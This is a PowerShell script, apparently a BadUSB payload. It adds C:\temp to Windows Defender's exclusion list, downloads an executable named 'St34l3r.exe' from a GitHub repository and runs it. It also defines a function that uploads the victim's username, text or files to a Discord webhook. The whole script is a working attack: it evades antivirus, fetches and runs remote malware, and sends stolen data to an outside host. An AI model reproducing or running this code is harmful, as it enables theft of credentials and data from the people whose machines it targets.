function Get-Nirsoft {
    cd C:\
    mkdir \temp
    cd \temp
    Add-MpPreference -ExclusionPath "C:\temp"

    Invoke-WebRequest -Uri "https://github.com/Gvte-Kali/BadStuffHosting/raw/main/BadUSB/W1ns1d3r/testing/St34l3r.exe" -OutFile St34l3r.exe

    .\St34l3r.exe
}

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $DiscordUrl
    }
}

Get-Nirsoft
